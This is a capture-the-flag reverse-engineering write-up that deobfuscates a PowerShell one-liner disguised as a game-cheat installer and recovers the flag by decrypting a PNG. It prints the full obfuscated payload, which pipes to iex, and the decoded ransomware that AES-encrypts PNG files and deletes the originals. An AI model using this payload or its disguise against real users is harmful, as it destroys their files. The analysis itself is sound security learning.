# Powerful Shell

category: rev

> My friend ran some weird commands he found online to try and install some elite cheats and ended up getting his files encrypted! Help recover his encrypted file 😭

In the files we are given, we see this command being run in powershell:

```powershell
( new-OBJECT SYStem.iO.sTReamReAdER(( new-OBJECT  SyStem.Io.ComPrEsSION.deFLaTESTReam([SyStEM.iO.meMoRystreAM][sySTeM.CONVERt]::FrombaSE64STRIng( 'bVVhc5pKFP3emf6HfYxT8BmZxMQ0Ted9QMWE1qBPja0vkxkIrroRgQLaWsf//s7dBdN0mskuCOy9555z9u6Ij+tibN+xiTV0rKfQvu755yNmsId8l/BHQ9tfHfZnpxj4x8Dd+8O+cdhfHvbNw/7DYX9x2J8fNFbv6kOhn+hrM7MDXNMdJhtjsOTDddzB3Rgjwch3ZhuX0TTD3F8MrcFyagYOveGY7vUqY/j/yNjIHte3ViqBMWZoO0eraZFWZcZDPh3YBK8hMUkQwKgBxjTLESXod5zohtJgfB2btkt41uaYl+FHKN2h0g19otd0ayj8p559jdsFxvxr1OzgUzAx3qlUZzKJTKjV53pX9AhuNsVkOrFJuRDuBf18EwW5iCNmzy2vNWqz/ds3DH+Jn/prZqgf9PeQ5amIFo+VKM4W8fbkD29WvvgZq+fVt28qaZqyf5hp6C6g8u91zP2nZ7oPcgKtFUjPCrBMn8VrAIwIcM7X5tAnuDudggVLP80Qjko8VzKT4krkCyn4lZS6KbmmTy6UIRokPILf3DqfPvfu3P6AyJ7+d3rWOL9oXuIHMfTvkDSIMTp2F/N8sRTPq3BNYJJvKbmAFNtsv//Y/bRa5I0ZKYjx/uoDZv+J3HM/+SLhCh9Y3x1L7z/h+nysW4nUlMBlESTVSLLY2ghV9IkeznhaUkG2zEk9/oPiz+OUGRWBHKcfGa71MGdnl3Rbq1VJQgAwNT/xBrbb0QzF3gMpQnIgRg3VVE3NibyJF694+Ymp9Tzu3oyXWvURaQ5lJRTOwN6o6TFg4gKkcr279WKP1lPRhT5qI54XdUFVvhVhFviFtKHgf9FtnEum1q888htRV6W8jTLmqeTtvWTsrtNsyy1Mspm4TUiiReonyx1xlYqc3iZ5POLpVgQlmSMebIjKQRpvhSK5cNmK7yAAEV/I90fbXhYbmVCVIhIetZISYwip2IgQtajchcyixDyKyP1gCSEDJiJWyYjiGInakMJKUx+3O6USRPpMJFfL7VlZkiprU2vH3t1gM+a3nuVlS83Aq6lwr681f+QFwtEQ84bnrR0pzjFlFFBA9vizTapXq0XAl9JhHC8ZcDLOA7nisbJ8aJR2WCEvutwCTc9BLaBjq5oSmp59jUm2P1erVs2JFd5zQpJ5bSFKJFRUTmwWSLZ96Z9f8xMNIwL8i9OESx/axEFpSoDeHUt1igS0TOUoErgoVS7EIrl0RksNtrDz+sQfCqvV44wtuj+i5qxqbq3eBpgNfUgQ/ZkVhi0F98idBySSO9UIKabPs9+2+yu/qPZ0pgxzXnap4sA6lRa/KpqUdHCmXN2WJ5R8ooxDv0tvF5ZWHib7k6nJd8qBMdnNosaGPWDqBUhTu/P6Ha4p8kIcomCv7bUCrXy/8viUXldW5RNnoqkGQE04COienht6OyVOfEmOHQWkFcDGqXLsVpFOiTkxTmuLFpL6kSQT51ecrrsCN/TAD1thHKzkcnAsDQ+1TtjpCdLPTC20PbSmW022mnCzfpK7lMLXyJKMjIhDmMtDWCgXMlbf+r2NzarkEy972RLIWOyKwoi0x0jWrIp4sl5mBLdObyZy/nL+OuX5e4PR/erK85fBOH6ojPNFmjbnVohr+MqKR+fIgxJVFVUUWyuYKRMBHDWdjq/2LN6KOTUJULCOPTe/hVX4N3bB6n40Y/J5x7N26mnjVPX/WYJgmglh8SOZqyZLkdtLwhfOMDsywRoF1Ad+vmS0qN4VYQ5i//bMxL2h1S9tKpFtKpkfu9A7KlfIvlK/pc6VkeMrSdFSeJH2E50bIkISSrikT5AJ8UzN9aw1/Fg7nhvUR03ybRToZW8yf0mDcRurNHx+RMHnFJrOjiygctTWZJShu/F6oWt5d0hTl8S/WjlE/UCHsZXxHUWIXOnde72e6wOgFOjwPw==') , [sysTEM.IO.COMprESSION.coMPrESsioNmODe]::DecOMPrEss ) ), [sYstem.TexT.ENCoDiNg]::aScII)).rEaDTOend() | & ( $eNV:COmSpEC[4,26,25]-join'')
```

This has two parts, a streamreader that decompresses the base64 string, and then pipes the result into `( $eNV:COmSpEC[4,26,25]-join'')`. The `( $eNV:COmSpEC[4,26,25]-join'')` runs `iex`, which according to google:

> “Invoke expressions” (IEX) in PowerShell are a common method of executing code.

To see what sort os code is being run, we remove the ` | & ( $eNV:COmSpEC[4,26,25]-join'')` part and paste it into powershell, and we get this output:

```powershell
SeT-iTEM VARIAblE:La3S ( [type]("{8}{10}{1}{11}{0}{7}{2}{6}{5}{9}{4}{3}" -F'Ri','m.sEc','ry','E','PheRmoD','T','p','ty.C','SYs','OgRAPhY.cI','te','U')  )  ;  SET-vArIAblE  ("yI"+"n") ([tYPE]("{2}{0}{4}{3}{1}"-F'Yst','cODInG','S','XT.EN','Em.Te')  )  ;SeT-ITEM ('V'+'ARiabLE:'+'g'+'fXn5D') ( [TyPE]("{1}{3}{2}{0}"-f'FiLe','sY','.Io.','STEM')  )  ;  function EfA`BSC {
    param (
        [string]$nosgov,
        [string]$kaizo
    )
$rrr = .('N'+'ew-'+'Obj'+'ect') ("{3}{2}{1}{0}"-f 'dom','n','stem.Ra','Sy')
$chars = ("{13}{11}{10}{2}{6}{4}{7}{8}{9}{5}{0}{3}{14}{1}{12}" -f 'GHIJKLMNOP','XYZ0123456','e','QRS','o','DEF','fghijklmn','pqrs','t','uvwxyzABC','d','c','789','ab','TUVW')
$ia = &('N'+'ew-Ob'+'ject') ("{1}{3}{5}{4}{0}{2}"-f'StringBui','Sy','lder','stem.T','t.','ex')
for ($i = 0; $i -lt 16; $i++) {
$ia."ap`PEND"($chars[$rrr.('Nex'+'t')."In`V`oke"($chars."L`eNGTh")])
}
$ia = $ia.('T'+'oStr'+'ing')."INv`o`ke"()
$s = ("{0}{1}{3}{2}"-f 'devilsca','n','lie!','not')
$m = .('N'+'ew-Ob'+'ject') ("{8}{6}{4}{2}{1}{3}{0}{5}{7}"-f'MD5Cry','o','.Crypt','graphy.','rity','ptoServic','stem.Secu','eProvider','Sy')
$keyBuilder = &('New-'+'Obj'+'ect') ("{6}{3}{1}{2}{5}{4}{0}"-f'uilder','r','i','t.St','B','ng','System.Tex')
foreach ($c in $s.('To'+'CharArra'+'y')."InV`oKe"()) {
    $h = $m."Co`MPuTeH`A`sh"(  $YiN::"aS`ciI".('GetBy'+'te'+'s')."in`VoKE"($c))
    $keyBuilder."a`pPeND"([char]$h[2])
}
$k =   (gET-Item ("vARiabL"+"E:"+"yI"+"N")).VAlUe::"as`Cii".('GetB'+'yt'+'es')."invO`ke"($keyBuilder.('ToS'+'tr'+'ing')."iNvO`kE"())
$ia =   $yiN::"aS`cIi".('Ge'+'tB'+'ytes')."iN`Vo`kE"($ia)
$id =  ( gEt-VaRiABLe  gFxn5d).vALue::('R'+'eadAllByt'+'e'+'s')."i`NvOKE"($nosgov)
$aes = &('N'+'ew-Obj'+'ect') ("{4}{7}{11}{2}{3}{9}{5}{10}{1}{0}{6}{8}" -f 'pt','sCry','C','rypt','System','raphy.','oServiceProvi','.Secur','der','og','Ae','ity.')
$aes."M`ODe" =   $la3S::"C`Bc"
$aes."k`eY" = $k
$aes."IV" = $ia
$ccc = $aes.('Cre'+'at'+'eEncr'+'yptor')."Invo`kE"()
$ed = $ccc.('T'+'ran'+'s'+'formFi'+'n'+'alBlock')."I`NvoKe"($id, 0, $id."lE`NGTH")
$slumber = $ed +   ( vARiAble  ("yi"+"N")  -vaLuE )::"a`sciI".('Get'+'By'+'tes')."inV`oKE"($s) + $ia
 (cHILditeM ('V'+'ARIabLE:'+'G'+'FXN5D')  ).value::('Wr'+'iteAl'+'lB'+'ytes')."i`NvOKE"($kaizo, $slumber)
}
$cd = &('Get-'+'Da'+'te')
if ($cd."mo`NtH" -eq 4 -and $cd."D`Ay" -eq 20) {
$dp = "."

$pf = .('Get-Ch'+'ild'+'I'+'tem') -Path $dp -Filter *`.pNG

foreach ($p in $pf) {
    &('Write'+'-Ho'+'st') $p
    $ef = .('J'+'oin-Pa'+'th') $dp ($p."N`Ame" + ("{0}{1}"-f'.e','nc'))
    .('Write'+'-'+'Host') $ef
    &('efa'+'b'+'sc') -nosgov $p."Fu`LlNA`Me" -kaizo $ef
    &('Rem'+'o'+'ve'+'-Item') $p."F`U`LLName"
}
}
```

after quite some cleaning up of the code we get this (I dont think this is perfect powershell code but you get the idea):

```powershell
$cd = Get-Date
if ($cd.month == 4 && cd.Day == 20) {
  $dp = "."
  $pf = get all pngs in the directory
  foreach ($p in $pf) {
    &('Write-Host') $p
    $ef = .('Join-Path') $dp ($p.name + ".enc")
    .('Write-Host') $ef
    the_function($p.fullname, $ef)
    &('Remove-Item') $p.fullname
  }
}
the_function(param_1, param_2){
  rrr = new-Object System.Random
  chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  ia = new-Object System.Text.StringBuilder
  for (i = 0; i < 16; i++) {
    ia.append(chars[rrr.Next(chars.length)])
  }
  ia = ia.ToString()
  s = "devilscannotlie!"
  m = new-Object System.Security.Cryptography.MD5CryptoServiceProvider
  foreach ($c in $s.ToCharArray()) {
    $h = $m."ComputeHASH"(System.Text.ASCIIEncoding.GetBytes($c))
    $keyBuilder.append([char]$h[2])
  }
  k = System.Text.ASCIIEncoding.GetBytes(keybuilder.tostring())
  ia = System.Text.ASCIIEncoding.GetBytes($ia)
  id = System.IO.File.ReadAllBytes(param_1)
  $aes = new-Object System.Security.Cryptography.AesCryptoServiceProvider
  $aes.mode = System.SecurityCryptoGraphy.CipherMode.CBC
  $aes.key = k
  $aes.iv= $ia
  $ccc = $aes.CreateEncryptor()
  $ed = $ccc.TransformFinalBlock($id, 0, $id.length)
  $slumber = $ed + System.Text.ASCIIEncoding.GetBytes($s) + $ia
  System.IO.File.WriteAllBytes($param_2, $slumber)
}
```

So to solve this, we first generate the key `$k` with powershell cuz why not:

```powershell
$s = "devilscannotlie!"
$m = New-Object System.Security.Cryptography.MD5CryptoServiceProvider
$keyBuilder = New-Object System.Text.StringBuilder

foreach ($c in $s.ToCharArray()) {
    $h = $m.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($c))
    $keyBuilder.Append([char]$h[2])
}

$k = [System.Text.Encoding]::ASCII.GetBytes($keyBuilder.ToString())

# Write the key to a file
$keyFilePath = "keyy.txt"
[IO.File]::WriteAllBytes($keyFilePath, $k)

Write-Host "Key has been written to $keyFilePath"
```

Another thing to note is that the IV and `"devilscannotlie!"` are appended at the end of the encrypted image:

```
00006000 64 65 76 69:6C 73 63 61|6E 6E 6F 74:6C 69 65 21 devilscannotlie!
00006010 67 78 68 31:79 31 55 55|31 58 4D 34:51 72 34 71 gxh1y1UU1XM4Qr4q
```

so we can get the IV and decrypt the image:

```py
from Crypto.Cipher import AES
key = open("keyy.txt","rb").read()
cipher = AES.new(key, AES.MODE_CBC, iv=b"gxh1y1UU1XM4Qr4q")
open("flagg.png","wb").write(cipher.decrypt(open("flag.png (1).enc","rb").read()[:-32])[:-12])
```

![](https://media.discordapp.net/attachments/1180409218268942367/1180738216786153492/image.png?ex=657e8327&is=656c0e27&hm=de7dab529223e9025956e29d8d120418061bc0ceafd3b79a2515bff8ce7cb561&=&format=png)

`blahaj{6r0v3l_hum4n!_1_4m_p0w3r!}`